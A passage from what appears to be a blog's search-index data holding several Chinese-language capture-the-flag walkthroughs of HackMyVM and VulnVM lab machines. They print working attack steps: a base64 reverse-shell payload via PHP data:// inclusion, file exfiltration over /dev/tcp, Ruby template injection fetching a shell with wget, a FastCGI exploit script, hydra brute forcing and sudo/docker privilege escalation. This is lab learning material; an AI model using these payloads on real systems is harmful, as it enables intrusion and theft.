http://192.168.55.11/contact.php\r200 GET 25l 127w 10359c http://192.168.55.11/icons/openlogo-75.png\r200 GET 368l 933w 10701c http://192.168.55.11/\r[####################] - 19s 220551/220551 0s found:3 errors:0 [####################] - 18s 220546/220546 12201/s http://192.168.55.11/ å…¶ä¸­contact.phpå¹¶æ²¡æœ‰ä»»ä½•å›æ˜¾ï¼Œå°è¯•å‚æ•°çˆ†ç ´\nFFUF #\r[root@kali] /home/kali â¯ ffuf -u \u0026#39;http://192.168.55.11/contact.php?FUZZ=/etc/passwd\u0026#39; -w /usr/share/fuzzDicts/paramDict/AllParam.txt -fs 0\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://192.168.55.11/contact.php?FUZZ=/etc/passwd\r:: Wordlist : FUZZ: /usr/share/fuzzDicts/paramDict/AllParam.txt\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response size: 0\r________________________________________________\rpage [Status: 200, Size: 1907, Words: 17, Lines: 36, Duration: 2ms]\r:: Progress: [74332/74332] :: Job [1/1] :: 13333 req/sec :: Duration: [0:00:05] :: Errors: 0 :: å‘ç°å¯ä»¥è¯»å–æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ç›´æ¥åˆ©ç”¨ä¼ªåè®®\nhttp://192.168.55.11/contact.php?page=data://text/plain,\u0026lt;?php system(\u0026#39;id\u0026#39;);?\u0026gt; http://192.168.55.11/contact.php?page=data://text/plain,\u0026lt;?php system(\u0026#39;printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC41NS40LzQ0NDQgMD4mMSkgJg==|base64 -d|bash\u0026#39;)?\u0026gt; Zip Crack #\rwww-data@debian:/var/www$ cat secure.zip \u0026gt; /dev/tcp/192.168.55.4/8888\r[root@kali] /home/kali/temp â¯ nc -lvnp 8888 \u0026gt; secure.zip listening on [any] 8888 ...\rconnect to [192.168.55.4] from (UNKNOWN) [192.168.55.11] 42980\r[root@kali] /home/kali/temp â¯ zip2john secure.zip \u0026gt;\u0026gt; zip.hash â\rver 2.0 efh 5455 efh 7875 secure.zip/password.txt PKZIP Encr: TS_chk, cmplen=96, decmplen=90, crc=4ADB6ACA ts=ABFC cs=abfc type=8\r[root@kali] /home/kali/temp â¯ john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8\rLoaded 1 password hash (PKZIP [32/64])\rWill run 8 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rbutterfly (secure.zip/password.txt) 1g 0:00:00:00 DONE (2025-04-21 22:09) 100.0g/s 1638Kp/s 1638Kc/s 1638KC/s 123456..cocoliso\rUse the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably\rSession completed. [root@kali] /home/kali/temp â¯ unzip secure.zip\rArchive: secure.zip\r[secure.zip] password.txt password: inflating: password.txt [root@kali] /home/kali/temp â¯ cat password.txt Hello your admin here, I have left your password down below for you to use!\r32(srT1Rne.Y å¾—åˆ°supportç”¨æˆ·çš„å¯†ç \nRoot #\rsupport@debian:~$ sudo -l\rMatching Defaults entries for support on debian:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\rUser support may run the following commands on debian:\r(ALL) NOPASSWD: /usr/bin/awk awk | GTFOBins å¯ä»¥åˆ©ç”¨awkç›´æ¥è¯»å–root.txt\nsupport@debian:~$ sudo /usr/bin/awk \u0026#39;//\u0026#39; /root/root.txt ä¹Ÿå¯ä»¥å¼€å¯ä¸€ä¸ªshell\nsupport@debian:~$ sudo /usr/bin/awk \u0026#39;BEGIN {system(\u0026#34;/bin/sh\u0026#34;)}\u0026#39;\r# whoami\rroot\r# id\ruid=0(root) gid=0(root) groups=0(root) Summary #\rUserï¼šç›®å½•æ‰«æï¼Œå‚æ•°FUZZï¼Œé€šè¿‡ä¼ªåè®®æ‹¿åˆ°www-dataï¼Œçˆ†ç ´å‹ç¼©åŒ…æ‹¿åˆ°supportçš„å¯†ç \nRootï¼šawkææƒ\n","date":"2025-04-22","externalUrl":null,"permalink":"/posts/2025/04/vulnvm-get/","section":"Posts","summary":"","title":"VulnVM-Get","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/hackingtoys â¯ nmap 192.168.55.10 -sV -A -p-\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)\r| ssh-hostkey: | 256 e7:ce:f2:f6:5d:a7:47:5a:16:2f:90:07:07:33:4e:a9 (ECDSA)\r|_ 256 09:db:b7:e8:ee:d4:52:b8:49:c3:cc:29:a5:6e:07:35 (ED25519)\r3000/tcp open ssl/ppp?\r|_ssl-date: TLS randomness does not represent time\r| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=FR\r| Not valid before: 2024-05-20T15:36:20\r|_Not valid after: 2038-01-27T15:36:20\r| fingerprint-strings: | GenericLines: | HTTP/1.0 400 Bad Request\r| Content-Length: 930\r| Puma caught this error: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma? (Puma::HttpParserError)\r| /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/client.rb:268:in `execute\u0026#39;\r| /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/client.rb:268:in `try_to_finish\u0026#39;\r| /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/server.rb:298:in `reactor_wakeup\u0026#39;\r| /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/server.rb:248:in `block in run\u0026#39;\r| /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/reactor.rb:119:in `wakeup!\u0026#39;\r| /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/reactor.rb:76:in `block in select_loop\u0026#39;\r| /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/reactor.rb:76:in `select\u0026#39;\r| /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/reactor.rb:76:in `select_loop\u0026#39;\r| /usr/loc\r| GetRequest: | HTTP/1.0 403 Forbidden\r| content-type: text/html; charset=UTF-8\r| Content-Length: 5702\r| \u0026lt;!DOCTYPE html\u0026gt;\r| \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\r| \u0026lt;head\u0026gt;\r| \u0026lt;meta charset=\u0026#34;utf-8\u0026#34; /\u0026gt;\r| \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt;\r| \u0026lt;meta name=\u0026#34;turbo-visit-control\u0026#34; content=\u0026#34;reload\u0026#34;\u0026gt;\r| \u0026lt;title\u0026gt;Action Controller: Exception caught\u0026lt;/title\u0026gt;\r| \u0026lt;style\u0026gt;\r| body {\r| background-color: #FAFAFA;\r| color: #333;\r| color-scheme: light dark;\r| supported-color-schemes: light dark;\r| margin: 0px;\r| body, p, ol, ul, td {\r| font-family: helvetica, verdana, arial, sans-serif;\r| font-size: 13px;\r| line-height: 18px;\r| font-size: 11px;\r| white-space: pre-wrap;\r| pre.box {\r| border: 1px solid #EEE;\r| padding: 10px;\r| margin: 0px;\r| width: 958px;\r| header {\r| color: #F0F0F0;\r| background: #C00;\r|_ padding: æŸ¥çœ‹3000ç«¯å£æœåŠ¡ï¼Œæ˜¯Ruby on rails\nSSTI #\rå…³äºRubyæ¨¡æ¿çš„é‚£äº›äº‹ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· å‘ç°æ¶ˆæ¯æç¤ºæ¡†æ¡†ä¸­å­˜åœ¨æ¨¡æ¿æ³¨å…¥\nåˆ©ç”¨æ¨¡æ¿ï¼Œè®°å¾—è¦URLencode\n\u0026lt;%= 7 * 7 %\u0026gt;\r\u0026lt;%= File.open(\u0026#39;/etc/passwd\u0026#39;).read %\u0026gt; \u0026lt;%= system(\u0026#39;wget 192.168.55.4/shell\u0026#39;) %\u0026gt;\r\u0026lt;%= system(\u0026#39;bash shell\u0026#39;) %\u0026gt; æˆåŠŸå¾—åˆ°åå¼¹shell\nOwn dodi #\ræŸ¥çœ‹å†…ç½‘ç«¯å£\nlidia@hacktoys:~$ ss -tuln\rNetid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process udp UNCONN 0 0 0.0.0.0:68 0.0.0.0:* tcp LISTEN 0 1024 0.0.0.0:3000 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* tcp LISTEN 0 511 127.0.0.1:80 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.1:9000 0.0.0.0:* tcp LISTEN 0 128 [::]:22 [::]:* å°†å…¶è½¬å‡ºæ¥\n[root@kali] /home/kali/Desktop/penelope (main) â¯ ssh -i ~/.ssh/id_rsa lidia@192.168.55.10 -L 80:127.0.0.1:80 -L 9000:127.0.0.1:9000 80ç«¯å£å¥½åƒæ²¡æœ‰ä»€ä¹ˆä¸œè¥¿ï¼Œå› ä¸ºåœ¨**/var/www/html**é‡Œé¢èƒ½çœ‹åˆ°\nPHP-FPMé»˜è®¤ç›‘å¬9000ç«¯å£ï¼Œå¦‚æœè¿™ä¸ªç«¯å£å¯ä»¥è¢«æˆ‘ä»¬ç›´æ¥è®¿é—®åˆ°ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥è‡ªå·±æ„é€ fastcgiåè®®ï¼Œå’Œfpmè¿›è¡Œé€šä¿¡ã€‚\nlidia@hacktoys:~$ cat /etc/apache2/sites-enabled/fastcgi.conf\r\u0026lt;VirtualHost 127.0.0.1:80\u0026gt;\rServerAdmin webmaster@localhost\rDocumentRoot /var/www/html\r\u0026lt;Directory /var/www/html\u0026gt;\rOptions +ExecCGI\rAddHandler fcgid-script .fcgi\rFCGIWrapper /usr/lib/cgi-bin/php-cgi .php\rDirectoryIndex index.php index.html\rAllowOverride All\rRequire all granted\r\u0026lt;/Directory\u0026gt;\rErrorLog ${APACHE_LOG_DIR}/error.log\rCustomLog ${APACHE_LOG_DIR}/access.log combined\r\u0026lt;/VirtualHost\u0026gt; å› æ­¤å¯ä»¥å‚è€ƒï¼š9000 - Pentesting FastCGI - HackTricks\nlidia@hacktoys:~$ cat a.sh #!/bin/bash\rPAYLOAD=\u0026#34;\u0026lt;?php echo \u0026#39;\u0026lt;!--\u0026#39;; system(\u0026#39;whoami\u0026#39;); echo \u0026#39;--\u0026gt;\u0026#39;;\u0026#34;\rFILENAMES=\u0026#34;/var/www/html/index.php\u0026#34; # Exisiting file path\rHOST=$1\rB64=$(echo \u0026#34;$PAYLOAD\u0026#34;|base64)\rfor FN in $FILENAMES; do\rOUTPUT=$(mktemp)\renv -i \\\rPHP_VALUE=\u0026#34;allow_url_include=1\u0026#34;$\u0026#39;\\n\u0026#39;\u0026#34;allow_url_fopen=1\u0026#34;$\u0026#39;\\n\u0026#39;\u0026#34;auto_prepend_file=\u0026#39;data://text/plain\\;base64,$B64\u0026#39;\u0026#34; \\\rSCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \\\rcgi-fcgi -bind -connect $HOST:9000 \u0026amp;\u0026gt; $OUTPUT\rcat $OUTPUT\rdone æˆåŠŸæ‰§è¡Œäº†å‘½ä»¤\nRoot #\rdodi@hacktoys:~$ sudo -l\rMatching Defaults entries for dodi on hacktoys:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\rUser dodi may run the following commands on hacktoys:\r(ALL : ALL) NOPASSWD: /usr/local/bin/rvm_rails.sh\rdodi@hacktoys:~$ cat /usr/local/bin/rvm_rails.sh #!/bin/bash\rexport rvm_prefix=/usr/local\rexport MY_RUBY_HOME=/usr/local/rvm/rubies/ruby-3.1.0\rexport RUBY_VERSION=ruby-3.1.0\rexport rvm_version=1.29.12\rexport rvm_bin_path=/usr/local/rvm/bin\rexport GEM_PATH=/usr/local/rvm/gems/ruby-3.1.0:/usr/local/rvm/gems/ruby-3.1.0@global\rexport GEM_HOME=/usr/local/rvm/gems/ruby-3.1.0\rexport PATH=/usr/local/rvm/gems/ruby-3.1.0/bin:/usr/local/rvm/gems/ruby-3.1.0@global/bin:/usr/local/rvm/rubies/ruby-3.1.0/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/rvm/bin\rexport IRBRC=/usr/local/rvm/rubies/ruby-3.1.0/.irbrc\rexport rvm_path=/usr/local/rvm\rexec /usr/local/rvm/gems/ruby-3.1.0/bin/rails \u0026#34;$@\u0026#34; æ³¨æ„åˆ°è¿™ä¸ªç›®å½•ï¼Œä¹‹å‰lidiaæ˜¯å¯ä»¥å†™å…¥çš„\nå› æ­¤å¯ä»¥ä¿®æ”¹è„šæœ¬å†…å®¹\nlidia@hacktoys:/usr/local/rvm/gems/ruby-3.1.0/bin$ mv rails rails.bak\rlidia@hacktoys:/usr/local/rvm/gems/ruby-3.1.0/bin$ echo \u0026#39;chmod u+s /usr/bin/bash\u0026#39; \u0026gt; rails\rlidia@hacktoys:/usr/local/rvm/gems/ruby-3.1.0/bin$ chmod +x rails\rdodi@hacktoys:~$ sudo /usr/local/bin/rvm_rails.sh Summary #\rUserï¼šRubyæ¨¡æ¿æ³¨å…¥æ‹¿åˆ°lidiaï¼Œé€šè¿‡å†…ç½‘ç«¯å£çš„FastCGIæ¼æ´æ‹¿åˆ°dodi\nRootï¼šé€šè¿‡lidiaä¿®æ”¹è„šæœ¬å†…å®¹ï¼Œå³å¯ææƒã€‚\n","date":"2025-04-21","externalUrl":null,"permalink":"/posts/2025/04/hackmyvm-hackingtoys/","section":"Posts","summary":"","title":"HackMyVM-HackingToys","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali â¯ nmap 192.168.56.158 -sV -A -p- PORT STATE SERVICE VERSION\r21/tcp open ftp vsftpd 3.0.3\r22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\r| ssh-hostkey: | 2048 fe:cd:90:19:74:91:ae:f5:64:a8:a5:e8:6f:6e:ef:7e (RSA)\r| 256 81:32:93:bd:ed:9b:e7:98:af:25:06:79:5f:de:91:5d (ECDSA)\r|_ 256 dd:72:74:5d:4d:2d:a3:62:3e:81:af:09:51:e0:14:4a (ED25519)\r80/tcp open http Apache httpd 2.4.38 ((Debian))\r|_http-server-header: Apache/2.4.38 (Debian)\r|_http-title: Pwned....!! Feroxbuster #\r[root@kali] /home/kali/pwned â¯ feroxbuster -u http://192.168.55.6/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x php,txt\r___ ___ __ __ __ __ __ ___\r|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__\r| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___\rby Ben \u0026#34;epi\u0026#34; Risher ğŸ¤“ ver: 2.11.0\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\rğŸ¯ Target Url â”‚ http://192.168.55.6/\rğŸš€ Threads â”‚ 50\rğŸ“– Wordlist â”‚ /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt\rğŸ‘Œ Status Codes â”‚ All Status Codes!\rğŸ’¥ Timeout (secs) â”‚ 7\rğŸ¦¡ User-Agent â”‚ feroxbuster/2.11.0\rğŸ’‰ Config File â”‚ /etc/feroxbuster/ferox-config.toml\rğŸ” Extract Links â”‚ true\rğŸ’² Extensions â”‚ [php, txt]\rğŸ HTTP methods â”‚ [GET]\rğŸ”ƒ Recursion Depth â”‚ 4\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\rğŸ Press [ENTER] to use the Scan Management Menuâ„¢\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r404 GET 9l 31w 274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 403 GET 9l 28w 277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 200 GET 16l 27w 194c http://192.168.55.6/nothing/nothing.html\r200 GET 75l 191w 3065c http://192.168.55.6/\r200 GET 4l 7w 41c http://192.168.55.6/robots.txt\r301 GET 9l 28w 314c http://192.168.55.6/nothing =\u0026gt; http://192.168.55.6/nothing/\r301 GET 9l 28w 318c http://192.168.55.6/hidden_text =\u0026gt; http://192.168.55.6/hidden_text/\r200 GET 22l 21w 211c http://192.168.55.6/hidden_text/secret.dic ä¸‹è½½è¿™ä¸ªdicç”¨ä½œæ‰«æå­—å…¸\n[root@kali] /home/kali/pwned â¯ feroxbuster -u http://192.168.55.6/ -w ./secret.dic -x php,txt ___ ___ __ __ __ __ __ ___\r|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__\r| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___\rby Ben \u0026#34;epi\u0026#34; Risher ğŸ¤“ ver: 2.11.0\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\rğŸ¯ Target Url â”‚ http://192.168.55.6/\rğŸš€ Threads â”‚ 50\rğŸ“– Wordlist â”‚ ./secret.dic\rğŸ‘Œ Status Codes â”‚ All Status Codes!\rğŸ’¥ Timeout (secs) â”‚ 7\rğŸ¦¡ User-Agent â”‚ feroxbuster/2.11.0\rğŸ’‰ Config File â”‚ /etc/feroxbuster/ferox-config.toml\rğŸ” Extract Links â”‚ true\rğŸ’² Extensions â”‚ [php, txt]\rğŸ HTTP methods â”‚ [GET]\rğŸ”ƒ Recursion Depth â”‚ 4\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\rğŸ Press [ENTER] to use the Scan Management Menuâ„¢\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r403 GET 9l 28w 277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 404 GET 9l 31w 274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 200 GET 16l 27w 194c http://192.168.55.6/nothing/nothing.html\r200 GET 75l 191w 3065c http://192.168.55.6/\r301 GET 9l 28w 317c http://192.168.55.6/pwned.vuln =\u0026gt; http://192.168.55.6/pwned.vuln/ å­˜åœ¨pwned.vulnè·¯å¾„ï¼Œåœ¨æºä»£ç ä¸­å‘ç°äº†ç”¨æˆ·å‡­è¯\n[root@kali] /home/kali/pwned â¯ curl http://192.168.55.6/pwned.vuln/ ..............\r..............\r\u0026lt;?php\r// if (isset($_POST[\u0026#39;submit\u0026#39;])) {\r// $un=$_POST[\u0026#39;username\u0026#39;];\r// $pw=$_POST[\u0026#39;password\u0026#39;];\r//\r// if ($un==\u0026#39;ftpuser\u0026#39; \u0026amp;\u0026amp; $pw==\u0026#39;B0ss_B!TcH\u0026#39;) {\r// echo \u0026#34;welcome\u0026#34;\r// exit();\r// }\r// else // echo \u0026#34;Invalid creds\u0026#34;\r// }\r?\u0026gt; FTP #\r[root@kali] /home/kali/pwned â¯ ftp 192.168.55.6 Connected to 192.168.55.6.\r220 (vsFTPd 3.0.3)\rName (192.168.55.6:kali): ftpuser\r331 Please specify the password.\rPassword: 230 Login successful.\rRemote system type is UNIX.\rUsing binary mode to transfer files.\rftp\u0026gt; ls\r229 Entering Extended Passive Mode (|||5205|)\r150 Here comes the directory listing.\rdrwxr-xr-x 2 0 0 4096 Jul 10 2020 share\r226 Directory send OK.\rftp\u0026gt; cd share\r250 Directory successfully changed.\rftp\u0026gt; ls\r229 Entering Extended Passive Mode (|||6289|)\r150 Here comes the directory listing.\r-rw-r--r-- 1 0 0 2602 Jul 09 2020 id_rsa\r-rw-r--r-- 1 0 0 75 Jul 09 2020 note.txt\r226 Directory send OK.\rftp\u0026gt; å¾—åˆ°ä¸€ä¸ªå¯†é’¥å’Œç•™è¨€ï¼Œå¯ä»¥ç”¨äºç™»å½•\n[root@kali] /home/kali/pwned â¯ chmod 600 id_rsa â\r[root@kali] /home/kali/pwned â¯ ssh -i id_rsa ariana@192.168.55.6\rLinux pwned 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64\rThe programs included with the Debian GNU/Linux system are free software;\rthe exact distribution terms for each program are described in the\rindividual files in /usr/share/doc/*/copyright.\rDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\rpermitted by applicable law.\rLast login: Fri Jul 10 13:03:23 2020 from 192.168.18.70\rariana@pwned:~$ ls\rariana-personal.diary user1.txt\rariana@pwned:~$ Own selena #\rariana@pwned:~$ sudo -l\rMatching Defaults entries for ariana on pwned:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rUser ariana may run the following commands on pwned:\r(selena) NOPASSWD: /home/messenger.sh æŸ¥çœ‹è¯¥è„šæœ¬ä¿¡æ¯\nariana@pwned:~$ cat /home/messenger.sh #!/bin/bash\rclear\recho \u0026#34;Welcome to linux.messenger \u0026#34;\recho \u0026#34;\u0026#34;\rusers=$(cat /etc/passwd | grep home | cut -d/ -f 3)\recho \u0026#34;\u0026#34;\recho \u0026#34;$users\u0026#34;\recho \u0026#34;\u0026#34;\rread -p \u0026#34;Enter username to send message : \u0026#34; name echo \u0026#34;\u0026#34;\rread -p \u0026#34;Enter message for $name :\u0026#34; msg\recho \u0026#34;\u0026#34;\recho \u0026#34;Sending message to $name \u0026#34;\r$msg 2\u0026gt; /dev/null\recho \u0026#34;\u0026#34;\recho \u0026#34;Message sent to $name :) \u0026#34;\recho \u0026#34;\u0026#34; å¯ä»¥çœ‹åˆ°msgæ˜¯æ‹¼æ¥åœ¨ 2\u0026gt;/dev/nullå‰é¢æ²¡æœ‰ä»»ä½•è¿‡æ»¤çš„\nåªéœ€è¦å°†msgè¾“å…¥ä¸º**/bin/bashå³å¯ç”Ÿæˆä¸€ä¸ªshell**\nWelcome to linux.messenger ariana:\rselena:\rftpuser:\rEnter username to send message : ariana\rEnter message for ariana :/bin/bash\rSending message to ariana whoami\rselena\rid\ruid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker) Root #\rå‘ç°å½“å‰ç¯å¢ƒæ˜¯Docker\nselena@pwned:~$ ip a\r1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\rlink/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\rinet 127.0.0.1/8 scope host lo\rvalid_lft forever preferred_lft forever\rinet6 ::1/128 scope host valid_lft forever preferred_lft forever\r2: enp0s3: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000\rlink/ether 08:00:27:32:e3:ef brd ff:ff:ff:ff:ff:ff\rinet 192.168.55.6/24 brd 192.168.55.255 scope global dynamic enp0s3\rvalid_lft 529sec preferred_lft 529sec\rinet6 fe80::a00:27ff:fe32:e3ef/64 scope link valid_lft forever preferred_lft forever\r3: docker0: \u0026lt;NO-CARRIER,BROADCAST,MULTICAST,UP\u0026gt; mtu 1500 qdisc noqueue state DOWN group default link/ether 02:42:cf:75:ba:55 brd ff:ff:ff:ff:ff:ff\rinet 172.17.0.1/16 brd 172.17.255.255 scope global docker0\rvalid_lft forever preferred_lft forever å¹¶ä¸”ç”¨æˆ·æ˜¯åœ¨dockerç»„ä¸­\ndocker | GTFOBins selena@pwned:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh\r# whoami\rroot\r# id\ruid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo) Summary #\ræ²¡å•¥å¥½å†™çš„ï¼Œå°±å½“åˆ·é¢˜äº†\n","date":"2025-04-20","externalUrl":null,"permalink":"/posts/2025/04/hackmyvm-pwned/","section":"Posts","summary":"","title":"HackMyVM-Pwned","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali â¯ nmap 192.168.56.157 -sV -A -p- PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.3 (protocol 2.0)\r| ssh-hostkey: | 3072 2c:1b:36:27:e5:4c:52:7b:3e:10:94:41:39:ef:b2:95 (RSA)\r| 256 93:c1:1e:32:24:0e:34:d9:02:0e:ff:c3:9c:59:9b:dd (ECDSA)\r|_ 256 81:ab:36:ec:b1:2b:5c:d2:86:55:12:0c:51:00:27:d7 (ED25519)\r80/tcp open http nginx\r|_http-title: Site doesn\u0026#39;t have a title (text/html). ç›®å½•æ‰«æå¤±è´¥\n[root@kali] /home/kali â¯ curl \u0026#34;http://192.168.56.157/\u0026#34; -v * Trying 192.168.56.157:80...\r* Connected to 192.168.56.157 (192.168.56.157) port 80\r* using HTTP/1.x\r\u0026gt; GET / HTTP/1.1\r\u0026gt; Host: 192.168.56.157\r\u0026gt; User-Agent: curl/8.12.1\r\u0026gt; Accept: */*\r\u0026gt; * Request completely sent off\r\u0026lt; HTTP/1.1 200 OK\r\u0026lt; Server: nginx\r\u0026lt; Date: Sat, 19 Apr 2025 06:42:57 GMT\r\u0026lt; Content-Type: text/html\r\u0026lt; Content-Length: 57\r\u0026lt; Last-Modified: Sun, 20 Sep 2020 16:29:39 GMT\r\u0026lt; Connection: keep-alive\r\u0026lt; ETag: \u0026#34;5f678373-39\u0026#34;\r\u0026lt; Accept-Ranges: bytes\r\u0026lt; Dont Overthink. Really, Its simple.\r\u0026lt;!-- Trust me --\u0026gt;\r* Connection #0 to host 192.168.56.157 left intact Hydra to ssh #\rå°è¯•ä½¿ç”¨simpleçˆ†ç ´ç™»å½•\nå‘ç°simpleä¸æ˜¯ç”¨æˆ·åè€Œæ˜¯å¯†ç \n[root@kali] /home/kali â¯ hydra -L ./Desktop/fuzzDicts/userNameDict/user.txt -p simple ssh://192.168.56.157 -I Hydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\rHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-19 14:45:35\r[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\r[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore\r[DATA] max 16 tasks per 1 server, overall 16 tasks, 8886 login tries (l:8886/p:1), ~556 tries per task\r[DATA] attacking ssh://192.168.56.157:22/\r[22][ssh] host: 192.168.56.157 login: root password: simple ç™»å½•æ‹¿åˆ°flag\n[root@kali] /home/kali â¯ ssh root@192.168.56.157 The authenticity of host \u0026#39;192.168.56.157 (192.168.56.157)\u0026#39; can\u0026#39;t be established.\rED25519 key fingerprint is SHA256:dXsAE5SaInFUaPinoxhcuNloPhb2/x2JhoGVdcF8Y6I.\rThis key is not known by any other names.\rAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\rWarning: Permanently added \u0026#39;192.168.56.157\u0026#39; (ED25519) to the list of known hosts.\rroot@192.168.56.157\u0026#39;s password: IM AN SSH SERVER\rgift:~# whoami\rroot\rgift:~# ls\rroot.txt user.txt ","date":"2025-04-19","externalUrl":null,"permalink":"/posts/2025/04/hackmyvm-gift/","section":"Posts","summary":"","title":"HackMyVM-Gift","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/homelab â¯ nmap 192.168.56.156 -sV -A -p-\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)\r| 